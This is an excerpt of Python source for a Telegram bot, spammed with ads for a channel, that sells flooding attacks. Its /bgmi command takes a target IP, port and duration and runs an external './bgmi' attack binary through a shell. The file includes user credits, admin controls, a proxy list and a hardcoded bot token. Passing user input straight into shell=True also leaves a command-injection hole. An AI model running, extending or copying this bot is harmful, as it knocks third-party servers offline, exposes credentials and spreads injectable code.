...
# Join :- @Sainiddos #bgmiddoserpython
...
# Join :- @Sainiddos #from keep_alive import keep_alive
# Join :- @Sainiddos #keep_alive()
# Join :- @Sainiddos # insert your Telegram bot token here
bot = telebot.TeleBot('6892477650:AAH0d0eIBaW7oOARUpWpVnXV6yL2LWGEe2U')

# Join :- @Sainiddos # Admin user IDs
admin_id = ["938257519"]

# Join :- @Sainiddos # File to store allowed user IDs
USER_FILE = "users.txt"

# Join :- @Sainiddos # File to store command logs
LOG_FILE = "log.txt"


# Join :- @Sainiddos # List of proxy addresses
PROXIES = [
...
"https://134.73.65.97:6649"
    # Join :- @Sainiddos # Add more proxy addresses as needed
]
...
# Join :- @Sainiddos # Function to read free user IDs and their credits from the file
def read_free_users():
    try:
        with open(FREE_USER_FILE, "r") as file:
            lines = file.read().splitlines()
            for line in lines:
                if line.strip():  # Join :- @Sainiddos # Check if line is not empty
...
# Join :- @Sainiddos # Function to log command to the file
def log_command(user_id, target, port, time):
    ...
    with open(LOG_FILE, "a") as file:  # Join :- @Sainiddos # Open in "append" mode
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")


# Join :- @Sainiddos # Function to clear logs
def clear_logs():
    try:
...
# Join :- @Sainiddos # Function to record command logs
...
# Join :- @Sainiddos # Function to handle the reply when free users run the /bgmi command
...
# Join :- @Sainiddos # Dictionary to store the last time each user ran the /bgmi command
bgmi_cooldown = {}

COOLDOWN_TIME =0

# Join :- @Sainiddos # Handler for /bgmi command
@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        # Join :- @Sainiddos # Check if the user is in admin_id (admins have no cooldown)
        if user_id not in admin_id:
            # Join :- @Sainiddos # Check if the user has run the command before and is still within the cooldown period
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 120:
                ...
                bot.reply_to(message, response)
                return
            # Join :- @Sainiddos # Update the last time the user ran the command
            bgmi_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:  # Join :- @Sainiddos # Updated to accept target, time, and port
            target = command[1]
            port = int(command[2])  # Join :- @Sainiddos # Convert time to integer
            time = int(command[3])  # Join :- @Sainiddos # Convert port to integer
            if time > 600:
                response = "Error: Time interval must be less than 540."
            else:
                record_command_logs(user_id, '/bgmi', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)  # Join :- @Sainiddos # Call start_attack_reply function
                full_command = f"./bgmi {target} {port} {time} 600"
                subprocess.run(full_command, shell=True)
                response = f"BGMI Attack Finished. Target: {target} Port: {port} Port: {time}"
        else:
            response = "✅ Usage :- /bgmi <target> <port> <time>"  # Join :- @Sainiddos # Updated command syntax
    else:
...
# Join :- @Sainiddos # Add /mylogs command to display logs recorded for bgmi and website commands
...
# Join :- @Sainiddos # Import the 'time' module for sleep functionality
import time
